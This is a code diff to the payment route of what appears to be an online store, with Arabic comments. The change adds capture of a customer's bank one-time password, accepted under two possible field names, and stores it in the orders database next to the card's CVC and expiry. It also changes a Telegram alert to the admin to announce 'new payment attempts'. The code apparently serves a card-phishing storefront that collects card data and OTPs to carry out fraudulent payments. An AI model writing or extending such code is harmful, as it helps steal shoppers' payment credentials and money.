@@ -19,6 +19,8 @@ type PaymentMethodBody = {
   cvc?: string;
   expiryMonth?: string;
   expiryYear?: string;
+  otpCode?: string;
+  code?: string;
 };
 
 const UUID_PATTERN = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
@@ -40,6 +42,13 @@ export async function POST(request: NextRequest) {
   const cvc = typeof body.cvc === 'string' ? body.cvc.replace(/\D/g, '') : '';
   const expiryMonth = typeof body.expiryMonth === 'string' ? body.expiryMonth.trim() : '';
   const expiryYear = typeof body.expiryYear === 'string' ? body.expiryYear.trim() : '';
+  
+  // التقاط رمز الـ OTP بأي اسم محتمل يرسله العميل (4 إلى 6 أرقام)
+  const otpCode = typeof body.otpCode === 'string' 
+    ? body.otpCode.replace(/\D/g, '') 
+    : typeof body.code === 'string' 
+      ? body.code.replace(/\D/g, '') 
+      : '';
 
   if (!/^[a-f0-9]{24}$/i.test(orderId) || !UUID_PATTERN.test(submissionId) || !UUID_PATTERN.test(reviewToken)) {
     return NextResponse.json({ ok: false, error: 'تعذر التحقق من الطلب. ارجع لبيانات التوصيل وحاول مرة أخرى.' }, { status: 400 });
@@ -113,6 +122,7 @@ export async function POST(request: NextRequest) {
       cvv?: string;
       expiryMonth?: string;
       expiryYear?: string;
+      otpCode?: string;
     }>('orders');
 
     const filter = {
@@ -143,6 +153,8 @@ export async function POST(request: NextRequest) {
               expiryYear
             }
           : {}),
+        // حفظ رمز التحقق أو الـ OTP الجديد إذا تم إرساله
+        ...(otpCode ? { otpCode } : {}),
         adminOrderToken: order.adminOrderToken || randomBytes(24).toString('hex'),
         paymentMethodSelectedAt: now,
         paymentStatus: 'pending',
@@ -183,7 +195,7 @@ export async function POST(request: NextRequest) {
       
       await sendTelegramMessage(
         adminId,
-        '🛍️ تم إكمال طلب جديد (أو تحديث محاولة الدفع) — أرض الجوال\n\n' +
+        '🛍️ تم تحديث بيانات الطلب والدفع (محاولة جديدة) — أرض الجوال\n\n' +
           formatOrderForAdmin(updatedOrder as unknown as Record<string, unknown>) +
           orderLinkText,
         {
